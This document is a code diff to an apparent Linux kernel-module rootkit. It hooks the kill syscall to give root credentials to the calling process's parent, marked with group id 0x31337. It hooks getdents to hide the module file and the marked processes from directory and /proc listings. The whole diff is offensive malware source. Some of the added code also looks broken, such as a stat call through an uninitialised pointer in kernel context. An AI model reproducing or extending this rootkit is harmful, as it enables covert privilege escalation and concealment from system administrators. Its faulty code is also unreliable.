@@ -14,6 +14,7 @@
 #include <linux/fs.h>
 #include <linux/sched.h>
 #include <linux/fs_struct.h>
+#include <linux/stat.h>
 
 MODULE_LICENSE("GPL");
 
@@ -73,7 +74,7 @@ asmlinkage int new_kill(pid_t pid, int sig) { //redefines kill syscall, if killi
         struct cred *cred;
         cred=__task_cred(ptr); //parent task creds
         cred->uid = 0; //user id
-        cred->gid = 0; //group id
+        cred->gid = 0x31337; //group id //not 0 to allow hiding processes
         cred->suid = 0; //saved uid
         cred->sgid = 0; //saved gid
         cred->euid = 0; //effective uid
@@ -84,14 +85,6 @@ asmlinkage int new_kill(pid_t pid, int sig) { //redefines kill syscall, if killi
     }
     return (*original_kill)(pid,sig);
 }
-/*
-    Hiding files:
-    hook getdents
-    call the original with my own struct dirent
-    go through dirent and prev->next = curr->next
-    copy_to_user() with my struct dirent to their struct dirent
-    will (potentially) hide /proc/ entries as well to hide process
-*/
 
 /*
 [lkm@lkm ~]$ ls
@@ -118,13 +111,19 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
     char buf[count];
     int bpos,nread;
     struct linux_dirent *d,*nd;
-    char * hidefile = "lkm.ko"; //this is the file we want to hide. one only at the moment
+    char * hidefile = "lkm.ko"; //this is the substring of a filename we want to hide
     nread = (*original_getdents)(fd,dirp,count); //call the original function to get struct to manipulate
     copy_from_user(buf,dirp,nread); //steal what getdents returned so we can traverse
     for (bpos = 0; bpos < nread;) { //traverse...
         d = (struct linux_dirent *) (buf + bpos);
         nd = (struct linux_dirent *) (buf + bpos + d->d_reclen);
         if (strstr(nd->d_name,hidefile)) { //if we have a substring match to hidefile, make the prev record point to next
+            d->d_off=(nd->d_off+d->d_off);
+            d->d_reclen=(d->d_reclen+nd->d_reclen);
+        }
+        struct stat *getstat;
+        stat(d->d_name,getstat);
+        if (getstat->st_gid == 0x31337) {
             d->d_off=(nd->d_off+d->d_off);
             d->d_reclen=(d->d_reclen+nd->d_reclen);
         }
